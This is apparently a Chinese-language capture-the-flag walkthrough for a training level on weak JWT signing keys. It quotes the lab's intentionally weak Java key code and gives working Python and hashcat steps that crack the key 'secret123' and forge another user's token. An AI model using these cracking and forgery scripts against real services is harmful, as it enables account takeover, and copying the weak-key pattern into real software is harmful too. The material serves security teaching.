# Level 3 — JWT 令牌安全

## 关卡说明

本关模拟一个使用弱密钥签名 JWT Token 的系统。由于签名密钥过于简单，攻击者可以通过离线爆破获取密钥，进而伪造任意用户的 JWT Token 实现越权访问。

**目标**：伪造用户 `tom` 的 JWT Token，调用用户信息接口获取 Flag。

**关卡提示**：系统中有一个账号叫 `tom`，尝试通过伪造 Token 获取其权限。

## 漏洞原理

### JWT 基础知识

JWT (JSON Web Token) 由三部分组成，以 `.` 分隔：

```
Header.Payload.Signature
```

- **Header**：声明签名算法，如 `{"alg":"HS256","typ":"JWT"}`
- **Payload**：存放用户数据，如 `{"username":"admin","role":"ADMIN"}`
- **Signature**：使用密钥对前两部分签名，防止篡改

> Header 和 Payload 仅经过 Base64Url 编码，**任何人都可以解码查看**，安全性完全依赖 Signature。

### 代码逻辑分析

本关后端代码位于 `JwtSecurityController.java`，关键接口：

| 接口 | 方法 | 说明 |
|------|------|------|
| `/api/challenge/auth-session/jwt/login` | POST | 登录并返回 JWT Token |
| `/api/challenge/auth-session/jwt/user_info` | GET | 验证 Token 返回用户信息 |

### 数据流

```
Step 1: 正常登录获取 Token
  POST /jwt/login  {username, password}
    ↓
  验证用户名密码 → 使用弱密钥生成 JWT
    ↓
  返回 Token（含 username, role 信息）

Step 2: 爆破签名密钥
  攻击者拿到 Token → 离线爆破 HS256 密钥
    ↓
  使用字典或工具（hashcat/jwt-cracker）尝试常见弱密钥
    ↓
  发现密钥 = "secret123"（通过填充逻辑达到 32 字节）

Step 3: 伪造 Tom 的 Token
  使用爆破出的密钥 → 生成 payload 为 {"username":"tom","role":"LEARNER"} 的 JWT
    ↓
  携带伪造 Token 访问 /jwt/user_info
    ↓
  服务器验证签名通过 → 返回 Flag
```

### 漏洞点详解

**弱密钥**（`JwtSecurityController.java` 第 41 行）：

```java
// 弱密钥 - 故意设置的弱点，仅 9 字符
private static final String WEAK_SECRET_KEY = "secret123";
```

**密钥填充逻辑**（第 47-54 行）：

```java
private SecretKey getPaddedKey() {
    // 将短密钥填充到 32 字节 (256 位)
    StringBuilder paddedKey = new StringBuilder(WEAK_SECRET_KEY);
    while (paddedKey.length() < 32) {
        paddedKey.append(WEAK_SECRET_KEY);  // 重复拼接
    }
    return Keys.hmacShaKeyFor(paddedKey.substring(0, 32).getBytes(StandardCharsets.UTF_8));
}
```

填充结果：`secret123secret123secret123secr`（`"secret123"` 重复拼接后截取前 32 字节）。

HS256 要求 256 位密钥，但短密钥通过重复填充达到长度要求后，熵值并未增加。攻击者只需爆破出原始密钥 `"secret123"`，即可还原完整密钥。

**Flag 触发条件**（第 185 行）：

```java
// 如果用户名是 tom 且角色是 learner，返回 flag
if ("tom".equalsIgnoreCase(username) && "learner".equalsIgnoreCase(role)) {
    String flag = flagService.getFlag("auth-session", "level3");
    result.put("flag", flag);
    return ResponseEntity.ok(result);
}
```

## 通关步骤

### Step 1：登录获取合法 JWT Token

```bash
curl -X POST http://localhost:8080/api/challenge/auth-session/jwt/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"e10adc3949ba59abbe56e057f20f883e"}'
```

> 密码需要 MD5 哈希后传输，`123456` 的 MD5 为 `e10adc3949ba59abbe56e057f20f883e`。

响应：

```json
{
  "success": true,
  "token": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInVzZXJuYW1lIjoiYWRtaW4iLCJyb2xlIjoiQURNSU4iLCJpYXQiOjE3NzM1NDEzMzgsImV4cCI6MTc3MzYyNzczOH0.xxxxx"
}
```

### Step 2：解码查看 Token 内容

```python
import base64
token = "eyJhbGci...xxxxx"
header = token.split('.')[0]
payload = token.split('.')[1]

# 补齐 Base64 padding
header_json = base64.urlsafe_b64decode(header + '==')
payload_json = base64.urlsafe_b64decode(payload + '==')

print(f"Header:  {header_json}")
print(f"Payload: {payload_json}")
```

输出：

```json
Header:  {"alg":"HS256","typ":"JWT"}
Payload: {"sub":"admin","username":"admin","role":"ADMIN","iat":1773541338,"exp":1773627738}
```

### Step 3：爆破签名密钥

**方式一：Python 脚本**

```python
import jwt

token = "你获取的完整Token"

# 常见弱密钥字典
weak_keys = ['secret', 'secret123', 'password', 'password123', 'admin', '123456', 'key', 'jwt_secret']

def pad_key(key):
    """还原服务端的密钥填充逻辑"""
    padded = key
    while len(padded) < 32:
        padded += key
    return padded[:32]

for key in weak_keys:
    try:
        padded_key = pad_key(key)
        decoded = jwt.decode(token, padded_key, algorithms=['HS256'])
        print(f"[+] 找到密钥: {key}")
        print(f"[+] 填充后: {padded_key}")
        print(f"[+] Payload: {decoded}")
        break
    except jwt.exceptions.InvalidSignatureError:
        print(f"[-] 尝试: {key} - 失败")
    except Exception as e:
        pass
```

**方式二：hashcat**

```bash
# 将 JWT 存入文件
echo "eyJhbGci...xxxxx" > jwt.txt

# 使用 hashcat 爆破
hashcat -m 16500 jwt.txt rockyou.txt
```

### Step 4：伪造 Tom 的 Token

```python
import jwt
from datetime import datetime, timedelta

original_key = "secret123"
padded_key = pad_key(original_key)

# 伪造 tom 用户的 Token
payload = {
    "sub": "tom",
    "username": "tom",
    "role": "LEARNER",  # 关键：role 必须是 LEARNER
    "iat": int(datetime.now().timestamp()),
    "exp": int((datetime.now() + timedelta(days=1)).timestamp())
}

forged_token = jwt.encode(payload, padded_key, algorithm="HS256")
print(f"伪造的 Token: {forged_token}")
```

### Step 5：使用伪造 Token 获取 Flag

```bash
curl -X GET http://localhost:8080/api/challenge/auth-session/jwt/user_info \
  -H "Authorization: Bearer <伪造的Token>"
```

响应：

```json
{
  "success": true,
  "message": "Welcome, tom! You have successfully forged the JWT token.",
  "flag": "flag{...}",
  "user": {
    "username": "tom",
    "role": "LEARNER",
    "email": "tom@madrabbit.com"
  }
}
```

### Step 6：提交 Flag

将获得的 Flag 提交到关卡右上角的 Flag 提交框中，即可通关。

## 涉及文件

| 文件 | 说明 |
|------|------|
| `controller/challenge/authsession/JwtSecurityController.java` | 后端 JWT 接口，弱密钥 + 填充逻辑 |
| `static/challenges/auth-session/jwt-brute.html` | 前端关卡页面 |
| `config/JwtAuthInterceptor.java` | 系统 JWT 拦截器（本关使用独立验证逻辑） |
| `service/FlagService.java` | Flag 获取与验证 |
